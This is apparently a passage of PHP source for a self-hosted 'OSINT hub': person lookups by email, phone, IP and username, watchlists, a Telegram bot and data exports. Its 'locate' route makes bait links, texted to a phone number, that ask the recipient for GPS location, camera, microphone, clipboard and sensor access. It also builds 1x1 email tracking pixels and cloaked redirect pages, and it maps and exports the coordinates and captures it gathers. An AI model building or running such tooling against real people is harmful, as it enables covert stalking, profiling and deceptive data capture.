            'lat'=>isset($d['lat']) ? (float)$d['lat'] : null,'lon'=>isset($d['lon']) ? (float)$d['lon'] : null,
            'accuracy'=>isset($d['acc']) ? (float)$d['acc'] : null,'geo_src'=>$d['geo_src'] ?? null,
            'fp'=>$meta['fp'] ?? null,'meta'=>$meta]);
        jout(['ok'=>true]); break;
    }

    case 'form': {
        header('Access-Control-Allow-Origin: *'); header('Access-Control-Allow-Headers: Content-Type');
        $d = json_decode((string)file_get_contents('php://input'), true) ?: $_POST;
        $d = array_map(fn($v) => is_scalar($v) ? mb_substr((string)$v,0,500) : $v, $d);
        $email = null; $phone = null;
        foreach ($d as $v) { if (!$email && filter_var($v,FILTER_VALIDATE_EMAIL)) $email = $v;
            if (!$phone && preg_match('/^\+?[\d\s\-\(\)\.]{7,}$/',(string)$v)) $phone = (string)$v; }
        record(['kind'=>'form','email'=>$email,'phone'=>$phone,'phone_e164'=>$phone ? phone_normalize($phone) : null,
            'meta'=>$d + ['page'=>$_SERVER['HTTP_REFERER'] ?? null]]);
        jout(['ok'=>true]); break;
    }

    case 'bot': {
        if (!flag('bot_enabled')) { jout(['ok'=>true]); break; }
        $in = json_decode((string)file_get_contents('php://input'), true) ?: [];
        $msg = $in['message'] ?? $in['edited_message'] ?? null;
        if (!$msg) { jout(['ok'=>true]); break; }
        $chat = (string)($msg['chat']['id'] ?? '');
        $text = trim((string)($msg['text'] ?? ''));
        $reply = '';
        if (str_starts_with($text,'/start') || str_starts_with($text,'/help'))
            $reply = "OSINT hub bot\n/lookup <email|phone|domain|ip>\n/user <handle>\n/watch <kind> <value>\n/status\n/links";
        elseif (str_starts_with($text,'/status')) {
            run_cron(false);
            $reply = "events: ".(int)db()->query('SELECT COUNT(*) FROM events')->fetchColumn()
                ."\nvisitors: ".(int)db()->query('SELECT COUNT(*) FROM visitors')->fetchColumn()
                ."\npending alerts: ".(int)db()->query('SELECT COUNT(*) FROM alerts WHERE sent=0')->fetchColumn();
        } elseif (str_starts_with($text,'/links')) {
            $rows = db()->query('SELECT slug,clicks FROM links ORDER BY id DESC LIMIT 8')->fetchAll();
            $reply = $rows ? implode("\n", array_map(fn($r) => $r['slug'].' ('.$r['clicks'].')', $rows)) : 'no links';
        } elseif (preg_match('/^\/lookup\s+(.+)$/',$text,$m)) {
            $v = trim($m[1]);
            if (filter_var($v,FILTER_VALIDATE_EMAIL)) { $r = email_osint($v); $reply = 'risk '.$r['risk']['score'].'/100 '.$r['risk']['level']."\nbreaches: ".count($r['breaches']); }
            elseif (filter_var($v,FILTER_VALIDATE_IP)) { $r = ip_osint($v,true); $reply = ($r['geo']['country'] ?? '?').' / '.($r['asn']['name'] ?? '?')."\ntor: ".($r['tor']?'yes':'no'); }
            elseif (phone_normalize($v)) { $r = phone_osint($v); $reply = $r['e164'].' '.$r['country_name'].' '.$r['line_type']."\nspam: ".$r['spam']['score']; }
            else { $r = domain_intel($v); $reply = $v."\nregistrar: ".($r['registrar'] ?? '?')."\nspf: ".(!empty($r['spf'])?'yes':'no'); }
        } elseif (preg_match('/^\/user\s+(.+)$/',$text,$m)) {
            $r = username_osint(trim($m[1]));
            $reply = 'found on '.$r['found'].'/'.$r['checked'];
        } elseif (preg_match('/^\/watch\s+(\w+)\s+(.+)$/',$text,$m)) {
            db()->prepare('REPLACE INTO watchlist (kind,value,created,runs,active) VALUES (?,?,?,0,1)')
                ->execute([$m[1], trim($m[2]), gmdate('Y-m-d H:i:s')]);
            $reply = 'watching '.$m[1].': '.trim($m[2]);
        } else $reply = 'unknown command - /help';
        if ($chat) send_telegram($reply, $chat);
        jout(['ok'=>true]); break;
    }

    case 'v1': {
        $r = strtolower((string)($_GET['r'] ?? 'status'));
        $out = match ($r) {
            'email'=>email_osint((string)($_GET['e'] ?? '')),
            'phone'=>phone_osint((string)($_GET['n'] ?? '')),
            'ip'=>ip_osint((string)($_GET['ip'] ?? '')),
            'user'=>username_osint((string)($_GET['u'] ?? '')),
            'domain'=>domain_intel((string)($_GET['d'] ?? '')),
            'dns'=>dns_records(norm_domain((string)($_GET['d'] ?? ''))),
            'tls'=>tls_info(norm_domain((string)($_GET['d'] ?? ''))),
            'subs'=>subdomains((string)($_GET['d'] ?? '')),
            'headers'=>sec_headers((string)($_GET['d'] ?? '')),
            'pass'=>pwned_password((string)($_GET['p'] ?? '')),
            'alerts'=>['ok'=>true,'alerts'=>db()->query('SELECT id,ts,kind,severity,subject,message FROM alerts ORDER BY id DESC LIMIT 30')->fetchAll()],
            'points'=>['ok'=>true,
                'events'=>(int)db()->query('SELECT COUNT(*) FROM events')->fetchColumn(),
                'visitors'=>(int)db()->query('SELECT COUNT(*) FROM visitors')->fetchColumn(),
                'points'=>db()->query('SELECT lat,lon,city,country,geo_src,accuracy,ts,kind FROM events WHERE lat IS NOT NULL AND lon IS NOT NULL ORDER BY id DESC LIMIT 400')->fetchAll()],
            default=>['ok'=>true,'app'=>APP_VER,'routes'=>['email','phone','ip','user','domain','dns','tls','subs','headers','pass','alerts','points']],
        };
        jout($out); break;
    }
    }
    exit;
}

/* -------- auth routes -------- */
if ($t === 'login') {
    start_session();
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $pw = (string)($_POST['pw'] ?? '');
        $stored = setting('master_password_hash');
        $ok = $stored ? password_verify($pw, $stored) : hash_equals($GLOBALS['CFG']['master_password'], $pw);
        if ($ok) { $_SESSION['master'] = true; $_SESSION['actor'] = 'master'; audit('login','success'); header('Location: '.url_for(['t'=>'dash'])); exit; }
        audit('login','failed'); render_login('Wrong password.'); exit;
    }
    render_login(); exit;
}
if ($t === 'logout') { start_session(); session_destroy(); header('Location: '.url_for(['t'=>'dash'])); exit; }

/* -------- public OSINT routes -------- */
if (in_array($t, ['email','phone','whois','profile','addr','rev','ip','user','dns','tls','subs','headers','pass','iban','tools','mac','time'], true)) {
    if (!flag('osint_enabled')) jout(['error'=>'OSINT disabled'],503);
    if (!rate_limit('osint')) jout(['error'=>'rate limit exceeded'],429);
    $json = !empty($_GET['json']) || str_contains((string)($_SERVER['HTTP_ACCEPT'] ?? ''),'json');

    switch ($t) {
    case 'email': $e = (string)($_GET['e'] ?? $_GET['email'] ?? '');
        $r = email_osint($e, !empty($_GET['deep']) || !empty($_GET['brute']), !empty($_GET['fast']));
        if (!empty($_GET['log'])) record(['kind'=>'email_lookup','email'=>$e]);
        $json ? jout($r) : render_report('Email', render_email_report($r)); break;
    case 'phone': $n = (string)($_GET['n'] ?? $_GET['number'] ?? '');
        $r = phone_osint($n, !empty($_GET['deep']), !empty($_GET['fast']));
        if (!empty($_GET['log'])) record(['kind'=>'phone_lookup','phone'=>$n,'phone_e164'=>$r['e164'] ?? null]);
        $json ? jout($r) : render_report('Phone', render_phone_report($r)); break;
    case 'ip': $r = ip_osint((string)($_GET['ip'] ?? client_ip()), !empty($_GET['deep']));
        if (!empty($_GET['log'])) record(['kind'=>'ip_lookup','target'=>(string)($_GET['ip'] ?? client_ip())]);
        $json ? jout($r) : render_report('IP', render_ip_report($r)); break;
    case 'user': $r = username_osint((string)($_GET['u'] ?? ''));
        $json ? jout($r) : render_report('Username', render_user_report($r)); break;
    case 'whois': $d = norm_domain((string)($_GET['d'] ?? $_GET['domain'] ?? ''));
        if ($d === '') { jout(['error'=>'pass ?d=domain.com'],422); break; }
        $r = domain_intel($d); $json ? jout($r) : render_report('Domain', render_domain_report($r)); break;
    case 'dns': $r = dns_records(norm_domain((string)($_GET['d'] ?? ''))); $json ? jout($r) : render_report('DNS', render_dns_report($r)); break;
    case 'tls': $r = tls_info(norm_domain((string)($_GET['d'] ?? ''))); $json ? jout($r) : render_report('TLS', render_tls_report($r)); break;
    case 'subs': $r = subdomains((string)($_GET['d'] ?? '')); $json ? jout($r) : render_report('Subdomains', render_subs_report($r)); break;
    case 'headers': $r = sec_headers((string)($_GET['d'] ?? '')); $json ? jout($r) : render_report('Headers', render_headers_report($r)); break;
    case 'pass': $r = pwned_password((string)($_GET['p'] ?? '')); $json ? jout($r) : render_report('Password', render_pass_report($r)); break;
    case 'iban': $r = tb_iban((string)($_GET['v'] ?? '')); $json ? jout($r) : render_report('IBAN', render_kv($r)); break;
    case 'mac': $mac = strtoupper(str_replace(['-','.'],':',(string)($_GET['m'] ?? '')));
        $v = cached('oui:'.substr($mac,0,8), fn() => trim((string)http('https://api.macvendors.com/'.urlencode(substr($mac,0,8)),['timeout'=>8])['body']), 86400*30);
        $r = ['mac'=>$mac,'oui'=>substr($mac,0,8),'vendor'=>$v ?: 'unknown'];
        $json ? jout($r) : render_report('MAC', render_kv($r)); break;
    case 'time': $r = tb_time((int)($_GET['ts'] ?? time())); $json ? jout($r) : render_report('Time', render_kv($r)); break;
    case 'tools': {
        $op = (string)($_GET['op'] ?? 'hash'); $v = (string)($_GET['v'] ?? '');
        $r = match ($op) {
            'hash'=>tb_hash($v, (string)($_GET['algo'] ?? 'sha256')), 'jwt'=>tb_jwt($v), 'iban'=>tb_iban($v),
            'luhn'=>tb_luhn($v), 'password'=>tb_password((int)($_GET['len'] ?? 20), (string)($_GET['set'] ?? 'full')),
            'entropy'=>tb_entropy($v), 'time'=>tb_time((int)($_GET['ts'] ?? time())), 'uuid'=>['uuid'=>tb_uuid()],
            'b64d'=>['decoded'=>(string)@base64_decode($v,true)], 'b64e'=>['encoded'=>base64_encode($v)],
            'hex'=>['hex'=>bin2hex($v)], 'unhex'=>['decoded'=>(string)@hex2bin($v)],
            'url'=>['encoded'=>rawurlencode($v),'decoded'=>rawurldecode($v)],
            'json'=>['parsed'=>json_decode($v,true),'valid'=>json_last_error() === JSON_ERROR_NONE],
            'rot13'=>['rot13'=>str_rot13($v)], 'slug'=>['slug'=>strtolower(preg_replace('/[^a-z0-9]+/i','-',$v))],
            'stats'=>['chars'=>strlen($v),'words'=>str_word_count($v),'lines'=>substr_count($v,"\n")+1,'sha256'=>hash('sha256',$v)],
            default=>['error'=>'unknown op'],
        };
        jout(['ok'=>true,'op'=>$op,'result'=>$r]); break;
    }
    case 'addr': $a = (string)($_GET['a'] ?? $_GET['address'] ?? '');
        $r = geocode($a);
        if (!empty($_GET['log'])) record(['kind'=>'address_lookup','address'=>$r['display_name'] ?? $a,'lat'=>$r['lat'] ?? null,'lon'=>$r['lon'] ?? null,'geo_src'=>'geocode']);
        $json ? jout($r) : render_report('Address', render_addr_report($r)); break;
    case 'rev': $lat = (float)($_GET['lat'] ?? 0); $lon = (float)($_GET['lon'] ?? 0);
        $r = reverse_geocode($lat,$lon); $json ? jout($r) : render_report('Coordinates', render_addr_report($r + ['lat'=>$lat,'lon'=>$lon])); break;
    case 'profile': {
        $ids = ['emails'=>[],'phones'=>[],'domains'=>[],'addresses'=>[]];
        foreach (['e'=>'emails','n'=>'phones','d'=>'domains','a'=>'addresses'] as $q=>$k) {
            if (empty($_GET[$q])) continue;
            foreach ((array)$_GET[$q] as $x) if (trim((string)$x) !== '') $ids[$k][] = trim((string)$x);
        }
        if (!array_filter($ids)) { jout(['error'=>'pass ?e= ?n= ?d= or ?a='],422); break; }
        $r = build_profile($ids); $json ? jout($r) : render_report('Profile', render_profile_report($r)); break;
    }
    }
    exit;
}

/* -------- authed routes -------- */
require_auth();
lazy_cron();

switch ($t) {

case 'locate': {
    $n = (string)($_GET['n'] ?? ''); $e164 = phone_normalize($n);
    if (!$e164) { jout(['error'=>'pass ?n=+15551234567'],422); break; }
    $s = slug();
    db()->prepare('INSERT INTO links (slug,destination,label,created,expires_at,max_clicks,require_consent,ask_location,ask_camera,ask_mic,ask_notify,ask_clip,ask_sensors,active)
        VALUES (?,?,?,?,?,?,1,1,?,?,?,?,?,1)')
        ->execute([$s,(string)($_GET['to'] ?? url_for(['t'=>'dash'])),(string)($_GET['label'] ?? 'Location request'),
            gmdate('Y-m-d H:i:s'),gmdate('Y-m-d H:i:s', time()+(int)($_GET['expires_days'] ?? 3)*86400),
            (int)($_GET['max_clicks'] ?? 5),!empty($_GET['cam'])?1:0,!empty($_GET['mic'])?1:0,
            !empty($_GET['notify'])?1:0,!empty($_GET['clip'])?1:0,!empty($_GET['sensors'])?1:0]);
    $url = url_for(['t'=>'l','s'=>$s]);
    $msg = (string)($_GET['msg'] ?? "Tap to share your location: $url");
    $send = !empty($_GET['send']) ? send_message($e164,$msg,['chain'=>array_filter(explode(',',(string)($_GET['via'] ?? ''))) ?: null]) : ['ok'=>null];
    audit('locate', $e164.' -> '.$url);
    jout(['ok'=>true,'url'=>$url,'to'=>$e164,'send'=>$send,'message'=>$msg,'qr'=>url_for(['t'=>'qr','d'=>$url])]); break;
}

case 'send': {
    $to = (string)($_GET['to'] ?? ''); $body = (string)($_GET['body'] ?? '');
    if (!$to || !$body) { jout(['error'=>'need ?to=&body='],422); break; }
    jout(send_message($to,$body,['chain'=>array_filter(explode(',',(string)($_GET['via'] ?? ''))) ?: null])); break;
}

case 'watch_add': {
    $in = $_POST ?: $_GET;
    $kind = (string)($in['kind'] ?? 'phone'); $val = trim((string)($in['value'] ?? ''));
    if ($kind === 'phone') $val = phone_normalize($val) ?? $val;
    if ($kind === 'email') $val = strtolower($val);
    db()->prepare('REPLACE INTO watchlist (kind,value,note,channel,created,runs,active) VALUES (?,?,?,?,?,0,1)')
        ->execute([$kind,$val,(string)($in['note'] ?? ''),(string)($in['channel'] ?? ''),gmdate('Y-m-d H:i:s')]);
    audit('watch_add', $kind.':'.$val);
    if (!empty($in['json'])) { jout(['ok'=>true]); break; }
    header('Location: '.url_for(['t'=>'dash'])); break;
}
case 'watch_del': { db()->prepare('DELETE FROM watchlist WHERE id = ?')->execute([(int)($_GET['id'] ?? 0)]); header('Location: '.url_for(['t'=>'dash'])); break; }

case 'cron': {
    global $CFG;
    start_session();
    if (!is_master() && !hash_equals($CFG['master_password'], (string)($_GET['secret'] ?? ''))
        && !check_api_key((string)($_GET['key'] ?? ''))) { jout(['error'=>'pass ?secret='],401); break; }
    jout(run_cron(true)); break;
}

case 'job_new': {
    $kind = (string)($_GET['kind'] ?? 'email'); $val = (string)($_GET['value'] ?? '');
    $payload = match ($kind) {
        'email'=>['email'=>$val],'phone'=>['phone'=>$val],'ip'=>['ip'=>$val],'user'=>['username'=>$val],
        'domain','subs'=>['domain'=>$val],'tls'=>['host'=>$val],default=>['value'=>$val],
    };
    jout(['ok'=>true,'job'=>job_push($kind,$payload,(int)($_GET['priority'] ?? 5),(string)($_GET['notify'] ?? '') ?: null)]); break;
}
case 'jobs': {
    $rows = db()->query('SELECT id,kind,status,attempts,created,finished FROM jobs ORDER BY id DESC LIMIT 40')->fetchAll();
    if (($_GET['run'] ?? '') === '1') jout(['ok'=>true,'run'=>job_run((int)($_GET['n'] ?? 3)),'jobs'=>$rows]);
    jout(['ok'=>true,'jobs'=>$rows]); break;
}

case 'settings': {
    $in = $_POST ?: $_GET;
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        foreach (DEFAULTS as $k=>$_) {
            if ($k === 'master_password_hash') continue;
            $v = isset($in[$k]) ? '1' : '0';
            if (in_array($k,['pool_concurrency','cache_ttl','retention_days','rate_limit_per_hour','lazy_cron_minutes'],true))
                $v = (string)max(0,(int)($in[$k] ?? 0));
            set_setting($k,$v);
        }
        if (!empty($in['new_password'])) set_setting('master_password_hash', password_hash((string)$in['new_password'], PASSWORD_DEFAULT));
        audit('settings_update','ok');
        header('Location: '.url_for(['t'=>'dash'])); break;
    }
    jout(['ok'=>true]); break;
}

case 'key_new': {
    $k = bin2hex(random_bytes(16));
    db()->prepare('INSERT INTO api_keys (k,label,scope,created,quota_hour,active) VALUES (?,?,?,?,?,1)')
        ->execute([$k,(string)($_GET['label'] ?? 'key'),in_array($_GET['scope'] ?? 'read',['read','write','admin'],true) ? $_GET['scope'] : 'read',
            gmdate('Y-m-d H:i:s'),(int)($_GET['quota'] ?? 0)]);
    audit('key_new',$k);
    if (!empty($_GET['json'])) { jout(['ok'=>true,'key'=>$k]); break; }
    header('Location: '.url_for(['t'=>'dash'])); break;
}
case 'key_del': { db()->prepare('DELETE FROM api_keys WHERE id = ?')->execute([(int)($_GET['id'] ?? 0)]); header('Location: '.url_for(['t'=>'dash'])); break; }

case 'link_new': {
    $in = $_POST ?: $_GET;
    $dest = (string)($in['url'] ?? $in['destination'] ?? '');
    if (!preg_match('~^https?://~i',$dest)) { jout(['error'=>'destination must be http(s)'],422); break; }
    $s = trim((string)($in['slug'] ?? '')) ?: slug();
    if (!preg_match('/^[a-z0-9_-]{2,32}$/i',$s)) $s = slug();
    $rules = json_decode((string)($in['rules'] ?? ''),true) ?: null;
    $splits = json_decode((string)($in['splits'] ?? ''),true) ?: null;
    $utm = null; if (trim((string)($in['utm'] ?? '')) !== '') { $u = []; parse_str(trim((string)$in['utm']), $u); $utm = $u ?: null; }
    try {
        db()->prepare('INSERT INTO links (slug,destination,label,created,expires_at,max_clicks,one_time,require_consent,
            ask_location,ask_camera,ask_mic,ask_notify,ask_clip,ask_sensors,password_hash,webhook,webhook_secret,rules,splits,utm,cloak,active)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,1)')
            ->execute([$s,$dest,(string)($in['label'] ?? ''),gmdate('Y-m-d H:i:s'),
                !empty($in['expires_days']) ? gmdate('Y-m-d H:i:s', time()+(int)$in['expires_days']*86400) : null,
                (int)($in['max_clicks'] ?? 0),!empty($in['one_time'])?1:0,
                isset($in['consent']) ? (int)(bool)$in['consent'] : 1,
                isset($in['ask_location']) ? (int)(bool)$in['ask_location'] : 1,
                isset($in['ask_camera']) ? (int)(bool)$in['ask_camera'] : 1,
                isset($in['ask_mic']) ? (int)(bool)$in['ask_mic'] : 1,
                isset($in['ask_notify']) ? (int)(bool)$in['ask_notify'] : 1,
                isset($in['ask_clip']) ? (int)(bool)$in['ask_clip'] : 1,
                isset($in['ask_sensors']) ? (int)(bool)$in['ask_sensors'] : 1,
                !empty($in['password']) ? password_hash((string)$in['password'], PASSWORD_DEFAULT) : null,
                (string)($in['webhook'] ?? '') ?: null, bin2hex(random_bytes(16)),
                $rules ? json_encode($rules) : null, $splits ? json_encode($splits) : null,
                $utm ? json_encode($utm) : null, !empty($in['cloak'])?1:0]);
    } catch (Throwable $e) { jout(['error'=>'slug taken'],409); break; }
    audit('link_new',$dest);
    if (!empty($in['json'])) { jout(['ok'=>true,'slug'=>$s,'url'=>url_for(['t'=>'l','s'=>$s])]); break; }
    header('Location: '.url_for(['t'=>'dash']).'#links'); break;
}
case 'link_del': { db()->prepare('DELETE FROM links WHERE slug = ?')->execute([(string)($_GET['s'] ?? '')]); header('Location: '.url_for(['t'=>'dash'])); break; }

case 'email_new': {
    $in = $_POST ?: $_GET; $s = slug();
    db()->prepare('INSERT INTO emails (slug,recipient,subject,created) VALUES (?,?,?,?)')
        ->execute([$s,(string)($in['to'] ?? ''),(string)($in['subject'] ?? ''),gmdate('Y-m-d H:i:s')]);
    $pixel = url_for(['t'=>'px','e'=>$s]);
    if (!empty($in['json'])) { jout(['ok'=>true,'pixel'=>$pixel,'img'=>'<img src="'.$pixel.'" width="1" height="1" alt="">']); break; }
    header('Location: '.url_for(['t'=>'dash'])); break;
}

case 'cap': {
    $st = db()->prepare('SELECT mime,data FROM captures WHERE id = ?'); $st->execute([(int)($_GET['id'] ?? 0)]);
    if (!($r = $st->fetch())) { http_response_code(404); break; }
    header('Content-Type: '.$r['mime']); header('Cache-Control: max-age=86400');
    echo base64_decode((string)$r['data']); break;
}

case 'notify_test': { jout(send_message((string)($_GET['to'] ?? ''), 'Test from '.base_url(), ['subject'=>'OSINT test'])); break; }
case 'env': { jout(env_report()); break; }

case 'selftest': {
    $c = []; $add = fn($n,$ok) => $c[] = ['check'=>$n,'pass'=>(bool)$ok];
    $add('php>=8.0', PHP_VERSION_ID >= 80000);
    $add('curl', function_exists('curl_init'));
    $add('curl_multi', function_exists('curl_multi_init'));
    $add('pdo driver', driver() === 'mysql' ? extension_loaded('pdo_mysql') : extension_loaded('pdo_sqlite'));
    $add('openssl', extension_loaded('openssl'));
    $add('https egress', port_open('dns.google',443));
    $add('dns.google', http('https://dns.google/resolve?name=example.com&type=A',['timeout'=>6])['status'] === 200);
    $add('rdap', http('https://rdap.org/domain/example.com',['timeout'=>8,'headers'=>['Accept: application/rdap+json']])['status'] === 200);
    $add('nominatim', http('https://nominatim.openstreetmap.org/search?q=paris&format=json',['timeout'=>8,'ua'=>APP_UA])['status'] === 200);
    $add('qr proxy', (bool)qr_png('test',100));
    $add('db write', (function () { try { set_setting('selftest','1'); return true; } catch (Throwable $e) { return false; } })());
    $add('smtp 25 out', port_open('smtp.gmail.com',25));
    $add('mail config', (bool)($GLOBALS['CFG']['messaging']['smtp_host'] || $GLOBALS['CFG']['messaging']['http_mail_key']));
    jout(['ok'=>true,'passed'=>count(array_filter($c,fn($x)=>$x['pass'])),'total'=>count($c),'checks'=>$c]); break;
}

case 'export': {
    $kind = preg_replace('/[^a-z_]/','',(string)($_GET['kind'] ?? 'events'));
    $fmt  = strtolower((string)($_GET['fmt'] ?? 'csv'));
    $pdo = db();
    $rows = match ($kind) {
        'visitors'=>$pdo->query('SELECT * FROM visitors ORDER BY last_seen DESC')->fetchAll(),
        'links'=>$pdo->query('SELECT * FROM links ORDER BY id DESC')->fetchAll(),
        'alerts'=>$pdo->query('SELECT * FROM alerts ORDER BY id DESC')->fetchAll(),
        'watchlist'=>$pdo->query('SELECT * FROM watchlist ORDER BY id DESC')->fetchAll(),
        'clicks'=>$pdo->query('SELECT * FROM clicks ORDER BY id DESC LIMIT 20000')->fetchAll(),
        'audit'=>$pdo->query('SELECT * FROM audit ORDER BY id DESC')->fetchAll(),
        default=>$pdo->query('SELECT * FROM events ORDER BY id DESC LIMIT 50000')->fetchAll(),
    };
    if ($fmt === 'json') { header('Content-Type: application/json'); header('Content-Disposition: attachment; filename="osint_'.$kind.'.json"'); echo json_encode($rows); break; }
    if ($fmt === 'ndjson') { header('Content-Type: application/x-ndjson'); foreach ($rows as $r) echo json_encode($r)."\n"; break; }
    if ($fmt === 'geojson') {
        $fc = ['type'=>'FeatureCollection','features'=>[]];
        foreach ($rows as $r) if (!empty($r['lat']) && !empty($r['lon']))
            $fc['features'][] = ['type'=>'Feature','geometry'=>['type'=>'Point','coordinates'=>[(float)$r['lon'],(float)$r['lat']]],
                'properties'=>['city'=>$r['city'] ?? null,'country'=>$r['country'] ?? null,'ts'=>$r['ts'] ?? null]];
        header('Content-Type: application/geo+json'); echo json_encode($fc); break;
    }
    if ($fmt === 'kml') {
        header('Content-Type: application/vnd.google-earth.kml+xml');
        echo '<?xml version="1.0" encoding="UTF-8"?><kml xmlns="http://www.opengis.net/kml/2.2"><Document>';
        foreach ($rows as $r) if (!empty($r['lat']) && !empty($r['lon']))
            echo '<Placemark><name>'.h(($r['city'] ?? '').' '.($r['country'] ?? '')).'</name><Point><coordinates>'.$r['lon'].','.$r['lat'].'</coordinates></Point></Placemark>';
        echo '</Document></kml>'; break;
    }
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="osint_'.$kind.'_'.gmdate('Ymd_His').'.csv"');
    $f = fopen('php://output','w');
    if ($rows) { fputcsv($f, array_keys($rows[0])); foreach ($rows as $r) fputcsv($f,$r); }
    fclose($f); break;
}

case 'api': {
    $pdo = db(); $days = max(1, min(90, (int)($_GET['days'] ?? 14)));
    $since = gmdate('Y-m-d H:i:s', time() - $days*86400);
    $col = driver() === 'sqlite' ? 'substr(ts,1,10)' : 'DATE(ts)';
    $series = []; for ($i = $days-1; $i >= 0; $i--) $series[gmdate('Y-m-d', time()-$i*86400)] = 0;
    foreach ($pdo->query("SELECT $col d, COUNT(*) c FROM events WHERE ts >= '$since' GROUP BY d") as $r)
        if (isset($series[$r['d']])) $series[$r['d']] = (int)$r['c'];
    $today = driver() === 'sqlite' ? "date('now')" : 'CURDATE()';
    jout(['totals'=>[
        'events'=>(int)$pdo->query('SELECT COUNT(*) FROM events')->fetchColumn(),
        'visitors'=>(int)$pdo->query('SELECT COUNT(*) FROM visitors')->fetchColumn(),
        'today'=>(int)$pdo->query("SELECT COUNT(*) FROM events WHERE ts >= $today")->fetchColumn(),
        'clicks'=>(int)$pdo->query("SELECT COUNT(*) FROM events WHERE kind='link_click'")->fetchColumn(),
        'gps'=>(int)$pdo->query("SELECT COUNT(*) FROM events WHERE geo_src='gps'")->fetchColumn(),
        'anomalies'=>(int)$pdo->query('SELECT COUNT(*) FROM events WHERE anomaly IS NOT NULL')->fetchColumn(),
        'jobs'=>(int)$pdo->query('SELECT COUNT(*) FROM jobs WHERE status="queued"')->fetchColumn()],
        'series'=>$series,
        'countries'=>$pdo->query("SELECT country, COUNT(*) c FROM events WHERE country<>'' AND country IS NOT NULL GROUP BY country ORDER BY c DESC LIMIT 15")->fetchAll(),
        'points'=>$pdo->query("SELECT lat,lon,city,country,address,geo_src,accuracy,ts,kind,anomaly FROM events WHERE lat IS NOT NULL AND lon IS NOT NULL ORDER BY id DESC LIMIT 400")->fetchAll(),
        'alerts'=>$pdo->query('SELECT * FROM alerts ORDER BY id DESC LIMIT 25')->fetchAll(),
        'recent'=>$pdo->query('SELECT * FROM events ORDER BY id DESC LIMIT 60')->fetchAll(),
        'keys'=>$pdo->query('SELECT id,label,scope,calls,last_used FROM api_keys ORDER BY id DESC LIMIT 20')->fetchAll(),
        'audit'=>$pdo->query('SELECT * FROM audit ORDER BY id DESC LIMIT 30')->fetchAll()]);
    break;
}

case 'dash': default: render_dashboard(); break;
}

/* ================================================================
 *  VIEWS
 * ================================================================ */
const PAGE_CSS = <<<'CSS'
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b0f17;color:#e8eef7;
 font:15px/1.6 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;padding:20px}
.card{background:#141a24;border:1px solid #232c3a;border-radius:16px;padding:26px;max-width:600px;width:100%}
h1{margin:0 0 6px;font-size:20px}.muted{color:#8b98ab;font-size:14px}
input,button{font:inherit;padding:11px 13px;border-radius:10px;border:1px solid #2b3547;background:#0e141d;color:#e8eef7;width:100%}
button{background:#3b82f6;border:0;color:#fff;font-weight:600;cursor:pointer;margin-top:10px}
form{margin-top:14px}ul{margin:8px 0 0;padding-left:18px}li{margin:4px 0;font-size:13px;color:#a9b6c8}
.badge{font-size:11px;padding:2px 8px;border-radius:20px;background:#1d4ed833;color:#93c5fd;border:1px solid #1d4ed866}
.small{font-size:12px;color:#64748b;margin-top:14px}a{color:#60a5fa}
CSS;
function render_page(string $title, string $msg, ?array $l): void {
    ?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title><?= h($title) ?></title><style><?= PAGE_CSS ?></style></head>
    <body><div class="card"><h1><?= h($title) ?></h1><p class="muted"><?= $msg ?></p></div></body></html><?php
}
function render_password(array $l, string $s): void {
    ?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Protected</title><style><?= PAGE_CSS ?></style></head><body><div class="card">
    <h1>Protected link</h1><p class="muted"><?= h($l['label'] ?: 'Password required.') ?></p>
    <form method="post"><input type="password" name="pw" placeholder="Password" autofocus required><button>Unlock</button></form>
    </div></body></html><?php
}
function render_login(string $err = ''): void {
    ?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Master control</title><style><?= PAGE_CSS ?></style></head><body><div class="card">
    <span class="badge">master control</span><h1>Sign in</h1>
    <p class="muted">Tracking, OSINT, watchlist, jobs, keys, audit.</p>
    <?php if ($err): ?><p style="color:#f87171"><?= h($err) ?></p><?php endif; ?>
    <form method="post"><input type="password" name="pw" placeholder="Master password" autofocus required><button>Sign in</button></form>
    <div class="small">Public: <code>?t=email</code> <code>?t=phone</code> <code>?t=ip</code> <code>?t=user</code> <code>?t=l&amp;s=</code></div>
    </div></body></html><?php
}
function render_cloak(string $dest, array $link): void {
    ?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title><?= h($link['label'] ?: 'Loading') ?></title><style><?= PAGE_CSS ?>
    .sp{width:34px;height:34px;border:3px solid #2b3547;border-top-color:#3b82f6;border-radius:50%;animation:s 1s linear infinite;margin:0 auto 14px}
    @keyframes s{to{transform:rotate(360deg)}}</style></head><body><div class="card" style="text-align:center">
    <div class="sp"></div><h1><?= h($link['label'] ?: 'Opening...') ?></h1>
    <p class="muted"><?= h(parse_url($dest,PHP_URL_HOST) ?: $dest) ?></p>
    <a href="<?= h($dest) ?>"><button>Continue</button></a></div>
    <script>setTimeout(function(){location.replace(<?= json_encode($dest) ?>);},400);</script>
    </body></html><?php
}
function render_consent(array $link, string $slug, ?string $dest = null): void {
    $dest ??= $link['destination'];
    $host = parse_url($dest, PHP_URL_HOST) ?: $dest;
    ?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Continue to <?= h($host) ?></title><style><?= PAGE_CSS ?>
    .chips{display:flex;flex-wrap:wrap;gap:6px;margin:14px 0}
    .chip{font-size:12px;padding:5px 11px;border-radius:20px;border:1px solid #2b3547;color:#8b98ab;background:#0e141d}
    .chip.on{border-color:#16a34a;color:#4ade80;background:#16a34a15}
    .chip.off{border-color:#7f1d1d;color:#f87171;background:#7f1d1d15}
    .row{display:flex;gap:8px;margin-top:6px}.row button{margin:0}
    .ghost{background:#1e293b;color:#e8eef7;border:1px solid #334155}
    #prev{width:100%;border-radius:10px;background:#000;display:none;margin-top:12px}
    .bar{height:6px;border-radius:4px;background:#1e293b;margin-top:10px;overflow:hidden}
